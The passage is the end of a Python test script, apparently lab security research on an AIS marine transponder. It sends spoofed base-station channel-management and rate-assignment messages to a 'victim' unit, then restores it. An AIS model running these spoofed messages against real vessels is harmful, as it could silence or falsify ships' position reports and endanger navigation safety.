            print("  FREQUENCY SWEEP. Recorder on AB. WARNING: if the unit ACCEPTS a target it")
            print("  moves off-channel and every later step (and its restore) is unheard, so a")
            print("  real acceptance ends the useful sweep. Recover with --chanmgmt-recover (the")
            print("  simulator retuned to the accepted channel) or the front panel.")
            print("=" * 72)
            rec(event="chanmgmt_sweep_start", n=len(sw),
                targets=[c for c, _ in SWEEP_TARGETS], def_ch=(DEF_CH_A, DEF_CH_B))
            for i, (name, payloads) in enumerate(sw):
                fire(name, payloads, i, len(sw), tag="SWEEP:",
                     extra={"command": "M22", "source": "base",
                            "target_ch": None if name.startswith("sweep_recover_")
                                         else int(name[len("sweep_ch"):])})
                if i < len(sw) - 1:
                    dwell = 6 if name.startswith("sweep_recover_") else args.chanmgmt_gap
                    print(f"    ...{dwell:.0f}s dwell (watch the witness: did the victim leave AB?)...")
                    time.sleep(dwell)
            print("    final recovery: restore-to-default on the default channel (x3)")
            for _ in range(3):
                ws.send(_m22_regional(BASE_MMSI, ctx.victim_lat, ctx.victim_lon,
                                      DEF_CH_A, DEF_CH_B, power=0))
                rec(event="final_recovery", meta="restore default after sweep")
                time.sleep(1)
            print("\n" + "!" * 72)
            print("  SWEEP DONE. If the unit is off-channel, retune the simulator to the accepted")
            print("  channel and run rf_session.py --chanmgmt-recover, or use the MKD front panel.")
            print("!" * 72)

        # ---- operator-driven recovery (--chanmgmt-recover): run with the simulator on the
        #      channel the unit is STUCK on so the restore actually reaches it ----
        if args.chanmgmt_recover:
            payloads = build_chanmgmt_recover(ctx)
            secs = max(60.0, args.chanmgmt_postroll)
            print("\n" + "=" * 72)
            print("  CHANMGMT RECOVER. Broadcasting restore-to-default (channels + power + rate +")
            print("  group cleared). This only works if the ais-simulator is transmitting on the")
            print("  channel the unit is CURRENTLY on -- retune the simulator there first.")
            print("=" * 72)
            rec(event="chanmgmt_recover_start", seconds=secs)
            end = time.time() + secs; r = 0
            while time.time() < end:
                for bits in payloads:
                    if all(c in "01" for c in bits):
                        ws.send(bits)
                rec(event="recover_sent", rep=r); r += 1
                print(f"      -> restore burst {r} (Ctrl-C to stop)")
                time.sleep(2)
            rec(event="chanmgmt_recover_end")
            print("    recover done. Check the witness / MKD for return to AIS1/AIS2.")

        # ---- phase 2: aggressive tests, larger gaps, severity-ordered ----
        if args.phase2 or args.phase2_only:
            p2 = build_phase2(ctx)
            print(f"\n=== PHASE 2: {len(p2)} aggressive tests, {args.phase2_gap}s apart ===")
            print("    (base-station power, channel swap, off-band retune, illegal rate,")
            print("     slot/TDMA overload -- may disrupt the transponder)\n")
            rec(event="phase2_start", n=len(p2), gap=args.phase2_gap)
            for i, (name, payloads) in enumerate(p2):
                # p2_force_fast_rate runs with the victim ANCHORED (slow autonomous rate), so if
                # the unit obeys the M16 its transmit rate jumps visibly above baseline.
                # p2_slow_rate_while_fast is the opposite: drive the victim FAST first so its
                # autonomous rate is high; if it then obeys a SLOW assignment it under-reports a
                # fast vessel (SOLAS violation). Keep it fast through the dwell, restore after.
                if name == "p2_slow_rate_while_fast":
                    gps.set_position(ctx.victim_lat, ctx.victim_lon,
                                     speed=args.fast_speed, course=90.0)
                    rec(event="victim_speed_set", speed=args.fast_speed,
                        note="fast so a slow-rate assignment would violate SOLAS speed/rate")
                    print(f"    (victim SOG set to {args.fast_speed}kn; letting fast reports establish)")
                    time.sleep(8)
                fire(name, payloads, i, len(p2), tag="P2:")
                if i < len(p2) - 1:
                    # recovery commands follow their retune attempt QUICKLY (short gap)
                    # so DY is not left off-channel for a full gap; other tests use the
                    # full phase2 gap so any disruption is observable.
                    if name.startswith("p2_retune_ch"):
                        print(f"    ...5s then recovery command...")
                        time.sleep(5)
                    else:
                        print(f"    ...{args.phase2_gap}s gap (watch for disruption)...")
                        time.sleep(args.phase2_gap)
                if name == "p2_slow_rate_while_fast":       # restore anchored baseline afterward
                    gps.set_position(ctx.victim_lat, ctx.victim_lon, speed=0.0)
                    rec(event="victim_speed_set", speed=0.0, note="restored after SOLAS rate test")

            # final safety recovery: no matter what, end by restoring AIS channels + power
            # + clearing any rate assignment. Uses the pyais-validated encoder so recovery
            # never depends on the hand-rolled path.
            print("    final recovery: restoring DY to AIS channels 2087/2088, high power")
            for _ in range(3):
                ws.send(p3enc.m22_channel(BASE_MMSI, args.victim_mmsi,
                                          channel_a=AIS_CH_A, channel_b=AIS_CH_B, power=0))
                ws.send(p3enc.m16_rate_assignment(BASE_MMSI, args.victim_mmsi, 20))
                rec(event="final_recovery", meta="restore AIS channels + high power + rate")
                time.sleep(1)

        # ---- phase 3: source-authority matrix (base vs regular per command) ----
        if args.phase3 or args.phase3_only:
            p3 = build_phase3(ctx)
            print(f"\n=== PHASE 3: SOURCE-AUTHORITY MATRIX: {len(p3)} cells, "
                  f"{args.phase3_gap}s dwell each ===")
            print("    each management command fired from BOTH a base station and a regular")
            print("    ship MMSI; long dwell so slow effects appear. Watch serial + VHF.\n")
            rec(event="phase3_start", n=len(p3), gap=args.phase3_gap,
                base_mmsi=BASE_MMSI, regular_mmsi=REGULAR_MMSI)
            for i, (name, payloads) in enumerate(p3):
                # tag each cell with its command and source so the analyzer can build
                # the 2xN table directly from the manifest.
                if name.startswith("p3_recover_after_"):
                    src = "recovery"; cmd = name.replace("p3_recover_after_", "")
                else:
                    # name form: p3_<command>_<source>
                    parts = name[len("p3_"):].rsplit("_", 1)
                    cmd = parts[0]; src = parts[1] if len(parts) > 1 else ""
                fire(name, payloads, i, len(p3), tag="P3:",
                     extra={"command": cmd, "source": src})
                # recovery cells need only a short settle; test cells get the full dwell
                dwell = 5 if name.startswith("p3_recover_after_") else args.phase3_gap
                if i < len(p3) - 1:
                    print(f"    ...{dwell:.0f}s dwell (observe effect on serial + VHF)...")
                    time.sleep(dwell)

            # final recovery again after phase 3
            print("    phase-3 final recovery: restoring AIS channels + high power + autonomous")
            for _ in range(3):
                ws.send(p3enc.m22_channel(BASE_MMSI, args.victim_mmsi,
                                          channel_a=AIS_CH_A, channel_b=AIS_CH_B, power=0))
                ws.send(p3enc.m16_rate_assignment(BASE_MMSI, args.victim_mmsi, 20))
                rec(event="final_recovery", meta="restore channels/power/rate after phase3")
                time.sleep(1)
    except KeyboardInterrupt:
        print("\ninterrupted.")
        rec(event="interrupted")
    finally:
        ws.close()
        gps.stop()
        rec(event="session_end")
        mf.close()

    print(f"\ndone. session manifest: {manifest}")
    print("Stop the listener and serial recorders, then send me:")
    print("  - listener NMEA (~/ais/ais_*.nmea)")
    print("  - transponder serial NMEA (ais_serial_*.nmea)")
    print(f"  - this manifest ({manifest})")


if __name__ == "__main__":
    main()
